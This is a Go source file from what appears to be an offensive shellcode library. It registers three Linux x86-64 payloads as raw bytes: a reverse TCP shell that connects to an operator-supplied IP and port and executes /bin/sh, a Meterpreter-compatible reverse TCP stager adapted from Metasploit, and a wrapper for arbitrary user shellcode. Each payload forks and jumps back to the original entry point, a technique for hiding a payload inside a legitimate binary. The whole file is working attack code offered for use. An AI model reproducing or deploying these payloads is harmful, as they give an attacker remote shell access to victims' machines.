package modules

import "github.com/awgh/shellcode/api"

func init() {
	api.RegisterShellCode(api.Linux, api.Intel, api.Bits64,
		"reverse_tcp_shell", reverse_tcp_shell_linux_intel_64)
	api.RegisterShellCode(api.Linux, api.Intel, api.Bits64,
		"reverse_tcp_stager", reverse_tcp_stager_linux_intel_64)
	api.RegisterShellCode(api.Linux, api.Intel, api.Bits64,
		"user_shellcode", user_shellcode_linux_intel_64)
}

func reverse_tcp_shell_linux_intel_64(params api.Parameters) ([]byte, error) {
	port := params.Port
	entry := params.Entry64
	ip := params.Ip

	//64bit shellcode
	shellcode1 := "\x6a\x39\x58\x0f\x05\x48\x85\xc0\x74\x0c"
	shellcode1 += "\x48\xBD"
	if as, err := api.PackUint64(entry); err == nil {
		shellcode1 += as
	} else {
		return nil, err
	}
	shellcode1 += "\xff\xe5"
	shellcode1 += "\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05" +
		"\x48\x97\x48\xb9\x02\x00"
	if ps, err := api.PackPort(port); err == nil {
		shellcode1 += ps
	} else {
		return nil, err
	}
	shellcode1 += api.PackIP(ip)
	shellcode1 += "\x51\x48\x89" +
		"\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05\x6a\x03\x5e\x48\xff\xce" +
		"\x6a\x21\x58\x0f\x05\x75\xf6\x6a\x3b\x58\x99\x48\xbb\x2f\x62" +
		"\x69\x6e\x2f\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48\x89\xe6" +
		"\x0f\x05"

	return []byte(shellcode1), nil
}

func reverse_tcp_stager_linux_intel_64(params api.Parameters) ([]byte, error) {
	port := params.Port
	entry := params.Entry64
	ip := params.Ip

	/*
	   FOR USE WITH STAGER TCP PAYLOADS INCLUDING METERPRETER
	   Modified metasploit payload/linux/x64/shell/reverse_tcp
	   to correctly fork the shellcode payload and contiue normal execution.
	*/

	//64bit shellcode
	shellcode1 := "\x6a\x39\x58\x0f\x05\x48\x85\xc0\x74\x0c"
	shellcode1 += "\x48\xBD"
	if as, err := api.PackUint64(entry); err == nil {
		shellcode1 += as
	} else {
		return nil, err
	}
	shellcode1 += "\xff\xe5"
	shellcode1 += "\x48\x31\xff\x6a\x09\x58\x99\xb6\x10\x48\x89\xd6\x4d\x31\xc9" +
		"\x6a\x22\x41\x5a\xb2\x07\x0f\x05\x56\x50\x6a\x29\x58\x99\x6a" +
		"\x02\x5f\x6a\x01\x5e\x0f\x05\x48\x97\x48\xb9\x02\x00"
	if ps, err := api.PackPort(port); err == nil {
		shellcode1 += ps
	} else {
		return nil, err
	}
	shellcode1 += api.PackIP(ip)
	shellcode1 += "\x51\x48\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f" +
		"\x05\x59\x5e\x5a\x0f\x05\xff\xe6"

	return []byte(shellcode1), nil
}

func user_shellcode_linux_intel_64(params api.Parameters) ([]byte, error) {
	entry := params.Entry64
	supplied_shellcode := params.ShellCode

	//64bit shellcode
	shellcode1 := "\x6a\x39\x58\x0f\x05\x48\x85\xc0\x74\x0c"
	shellcode1 += "\x48\xBD"
	if as, err := api.PackUint64(entry); err == nil {
		shellcode1 += as
	} else {
		return nil, err
	}
	shellcode1 += "\xff\xe5"

	//SHELLCODE
	shellcode1 += string(supplied_shellcode)

	return []byte(shellcode1), nil
}
